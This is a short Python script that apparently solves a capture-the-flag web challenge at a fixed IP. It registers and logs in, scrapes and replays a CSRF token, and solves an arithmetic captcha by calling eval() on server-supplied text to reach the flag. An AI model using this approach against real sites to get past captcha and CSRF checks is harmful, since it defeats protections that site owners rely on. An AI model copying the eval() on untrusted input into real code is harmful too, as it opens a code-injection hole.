import requests
import time
from bs4 import BeautifulSoup

salt = str(int(time.time()))
login = {
    'txtUsername': 'log' + salt,
    'txtPassword': '1'
}

r1 = requests.post('http://3.122.236.22/register', data=login)
csrf_token  = {
    'csrf_token': ''
}

captcha = {
    'captcha' : ''
}

with requests.session() as c:
    r = c.post('http://3.122.236.22/login', data=login)
    res = c.get('http://3.122.236.22/03260ba26962d30022575756459ce5fe')
    p = c.post('http://3.122.236.22/03260ba26962d30022575756459ce5fe')
    soup = BeautifulSoup(p.text, 'html.parser')
    input_tag = soup.find(attrs={'name' : 'csrf_token'})
    csrf_token['csrf_token'] = input_tag['value']
    p = c.post('http://3.122.236.22/level3', data=csrf_token)
    soup2 = BeautifulSoup(p.text, 'html.parser')
    label = soup2.find('label')
    captcha['captcha'] = str(eval(label.text[:-1]))
    p = c.post('http://3.122.236.22/level4', data=captcha)
    soup3 = BeautifulSoup(p.text, 'html.parser')
    flag = soup3.find_all('h1')[-1].text
    print(flag)
